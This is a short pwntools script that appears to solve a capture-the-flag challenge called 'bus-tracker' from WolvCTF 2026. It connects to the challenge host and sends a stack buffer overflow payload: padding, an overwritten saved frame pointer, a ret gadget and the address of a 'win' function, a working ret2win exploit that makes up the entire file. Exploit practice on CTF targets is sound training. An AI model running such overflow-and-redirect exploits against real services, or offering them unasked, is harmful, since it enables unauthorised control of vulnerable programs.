from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

HOST, PORT = 'bus-tracker.wolvctf-2026.kctf.cloud', 1337
RET, WIN = 0x4018b3, 0x4017e5

io = remote(HOST, PORT)
io.recvuntil(b'Enter your stop name: ')

payload  = b'A' * 0x40
payload += b'B' * 8
payload += p64(RET) + p64(WIN)

io.send(payload)
print(io.recvall(timeout=5).decode())
